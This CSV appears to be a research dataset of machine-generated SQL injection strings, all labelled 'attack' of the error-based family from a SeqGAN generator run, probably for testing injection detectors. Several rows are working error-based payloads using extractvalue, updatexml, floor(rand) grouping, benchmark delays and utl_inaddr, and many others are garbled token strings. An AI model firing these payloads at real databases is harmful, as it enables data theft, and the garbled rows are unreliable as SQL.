label,payload,family,payload_type,method,run_id,sample_index
attack,"1%""  =  "" oruayu.achr  (  ||chr  (  =  ,  0  select 'i'  select or 9067  unionrus  )     6055  #na SELECT 1 N else  by end  rand  )   or  select   )    )     )   or 4510 or group R  select0x4b774c75 group select x INN""  =  ""  ,  )     1   )    6082dit_rthr.x.r  6270  =  (   1 1 3931 1 by 1 DIMI x when  *  having else ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,456
attack,1h'ualtel_dre   (  )  0   )  ||asysnasu'  =  'utuitzz,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,457
attack,"1'   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   'al_nayraxhrysu.3326  (  ||chr  (  =  case dauaanaa 2017  6825  case 0 x 3051 information_schemarxsytrtdoy.1045r  =  )  )   WHERE 1 concat  select c(  5192,1   SELECT by r    (  case from where U union 0  ,  (  ,  ||ch  (  (  rand  *(  )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,458
attack,"1x""and group from(  select D FROM  (  0x5c  =  )     )    )  ),concat  (    )  6055  )   from xr from   (   0AND ||  (  =     a 1 AND 0 end     5305   ||chrhvhr  113  ||  (  ||""  ,hr  6825  chx  (     in,     )    )   )    bSELECT when   (  select union x  )   -- from x  t else  from  (  0  ,0x717a767a71,1   and 5584 group 1 ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,459
attack,"1%'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'i'  =  'ua6913",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,460
attack,"-'+  (  select 'or) and case >  (  (  =  )   SELECT 5584 from 1 endu,0x717a767a71ac0x7171706a710x717a767a71,7469  ||c  as  union when    )  )    select  end   floor  ))   x 1 andhr  (  =  ||  (||s U else   having group end  )       ||cs group  ||chhr  rand  (  113  3440  --5483  then m)   or     60553440  D  =  )     )   (  a R  )  ,1  )    (1 ) )   )   ,concat",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,461
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 't",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,462
attack,"-5967     SELECT from end   5856  case 0 or  from  (  ||chr  (  )  >  =  )   )  x,select   x whens  x  ||chr  chrhro  (  (  9891,  ||  select 6825 from  (  6825,concat  =  4493  ||chrl and_hr 122  ,  case a whenamUAS113 LINSCSNsIchros   6082  2017  (  ||chs  (  )   SELECT        when   (  =  *  ),",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,463
attack,"-qHextractvaluesfer    4232  ,0x717a767a71,  )  ||  ||chr  (  ||I  (  )  ||chr  (  rand  =  )   x and from WHERE )   a      1  else 6825 when FROM  ||chhr  (  0 or 1 group DIM 3785 cNunia   (      )   then AND  ||chr  (  (  case select AL.AOSfloorc'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'r  (  =t  )  )     )  --,concat  6913   :drt_(  ""  =  ""  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,464
attack,"1%u""' like 'b",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,465
attack,"-5978'   )    )     )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (     (  'thr  4232  ,  0x5c  ||chr  selectas m when   = 3051 DAND concat  (  #  )  x   select (  case 1 end  randal*in   )    FROM#er  (  )  *,floor  (  case =  ) x union 6   else 4493    ,1  6055  4232  )    from and x N end  )     thenI end   ue ASTINTohr  (  =  ||  (  )  ||chr  extractvalue  )  ||chr  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,466
attack,"1%j%p*' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'tw  (  )  thencoutan_adal_lelt_as DINUMACnTE0x717a767a71select   x2    or else 1 union      )  ,concat  =  tina group 0 from 0 1  concat  113  ||chr  (  ||  (  (  )  ||chr  (  )  (  0  ,9173       ||hr  =  (  , =  ,0x717a767a71uzl   )  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,467
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  '0x717a767a7159965840  0 )  select  else 1 else or 9067 or else  (  select end   and ddddrhr  (  6825  4232  select dextractvalue.dr.chr  (    ||chr  (  ) when  1297  ||chr  (  ||cu  (  (   )   || from concat    (  ||chr  dr  (  >  ||chr  ),1 from  )  ,hr  case m   WHERE else t group R.STw  am du    112  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,468
attack,"ISs' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'ndq",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,469
attack,1'||  (  select 'kyLu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,470
attack,"1%'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ''  =  'jb    ' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and '1045"" like ""0x717a767a71pa.unanal_'  =  'ain  (  0  =  =  )  0  ,  (     12 from group IIT  euin  106  )    113    =,0x717a767a71concat  --i,  *1045||chr    nu2   )        (  having Q5192C group end   )    )     )   )  ,   SELECTs end    FROM when   ),Rs m   having by 2 groupGconcat  --  )      thenand h1radr    from (  select ,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,471
attack,"1""0x717a767a71,floor  a  *2   )   || or x  drar  (  (    )     ) and #   )     )     ||  )  select whenl  (  =  ,concat  113  ||chr  (  u   )   a from 0  randechr   (h,then  select from 1 hr  (  rand  case   (   information_schema  )     )  ||chr  s  =",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,472
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'o_zpUwu"" like ""3326",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,473
attack,"17469%7810%a6270havingseasys.t  (  113  R  =  *2   a    (  (  ||chr  (  =  6237,concat  0x7171706a71   (  ||chr  select  from  (     select WHERE ||'||  (  select 'hsx.s.U_WHERE 1392ads  FROM.  hchr  select12   )    )    )     from 1 d x LINT gCd.gos  )   fromx.e ) WHERE 1 xT L NNT  (  (  ||cht_sr   (",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,474
attack,1'tia_tt_ina--xsadyMoyyseuin_admnamaz_r,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,475
attack,"1""   112  ,floor  (  )  4510  (     )    (  )  = and union from when  selectcun_acl  (  (  =  )  )     )      ,M union 1 1T  )  )   x  =,0x717a767a71,1   )   then or 8488 1  y  =l   )    ))    and  ,floor  113  ,0x717a767a71i  ||r  3326  122  ~  (  )  )    extractvalue  ||x xST where 4386  )  ||in*n)   )  rand   and or 0 from group ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,476
attack,"17319'  0 from aua when  (  0x5c0x5c,  ||DRount_aastos _ Wsyeetinaunter.ar..  (  || DUNI.UNUINNcT  1045(  ||chr  0x5c  ||chr  (  113  )    )     )  #",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,477
attack,"1%{""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,478
attack,"1tjz.7881eat.gu' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'e(  (  4493  ,,  ||  rand  FROMt 3931 fromuan  rand  (  ,  )   4510",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,479
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'information_schema",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,480
attack,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'baju2an",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,481
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'n",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,482
attack,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,483
attack,-or1%yNASNIIi n,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,484
attack,"1' and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and 'x'  =  'kf'  =  'bpnau,",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,485
attack,"-5996    rand  0   (  )    )    ,floor   x  4232  )  *adl  (  a 3051 union 0 0 hx  (  =  R 1I. 0 1210  rand    5305 ) FROM   then 1 ||  chr  (  113  select and xu0x717a767a71",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,486
attack,"1('+  (  select '   (  (  )   9325  a   )   x  1 byu2   )    ,floor  rand  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,487
attack,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'IqS+6085p  *     ) else by select 3785 r DNISSNTNUULIUS.USTINbyyT  =  )  rand,1   then by   SELECT by from   from selectWHERE when   (       )  ||chttss.x  -s x  DRUSSUunion FROM 0   or concat  e  amll    )  =  *,0x717a767a71,2|| 0 dr  ae from  achr  x where group group 11x._T  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,488
attack,"-7810ISThrselect 3440  ,concat  122  when  )  ,floor  rand  select 1  end   SELECT information_schema.s.chr  (  ||chr  (  122  113  ||  ||r  (  )  (  (  =       then 4493 where IM R   from 106  )  =  ||cr  )   ),concat  )       ,0x717a767a71,concat  =  )   then end  )   )   WHERE or 0a   )       AND1 1 d else by D   RMI.r.UT  )  *2   )    ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,489
attack,"-65305=  --,0x717a767a712,  )    )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,490
attack,1jw,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,491
attack,"-7864select LNU A.T else 50000001  )     )   SELECT group union when   (  )   tr  (   case ,  )    select   )    =  ||chr  (  SELECT end  )    )0x717a767a71=  =  )  ,    4493  select ||chhr  (  =  ||r  select and(  (  select union 1 else )    )O""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""    then x  case end  )havingna end   e )  )  abxddhhr  (  select   3326 1 9891 where   thenx *",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,492
attack,"1"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""athr  6055  ||chr  (  *  6825,    havingD  )  ,  ||xa when   then then   (  (  select   e  )   tdbptr  (  112  )   then from  113  ||chr  =  )   xx   or x end  0  )   )     )   )    )     --i,thenr  (  )  6237,concat  =  0   )  case 4386 group FROM(  =  ||r  (  )   then by else 3440  )    FROM concat  ||chr  (  select   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,493
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'jw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,494
attack,"11 Jinformation_schema' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'f_bfsntts0x7171706a71,rounatrids.x.r.dr.thr    =  =  || information_schema or endE  )    then and ms 8488 end   WHERE from when  )    and   or  1 or  1 (  case D 17881 SpINCT.SNconcat6055(  a 0   x D end  )         )     )  ||chr  (  select FROM delsetc  uatsxs 0 9067 or  ||coun",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,495
attack,"1wzvez'  =  'TSELECTtolunialxj,hxunlfvo",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,496
attack,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'ehsi",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,497
attack,1yf'  =  'n,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,498
attack,"1'||  (  select 'r m    xu    )     n when   (  benchmark  113  ,  113  rand  (   4232  *     )  )   )   and  6237",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,499
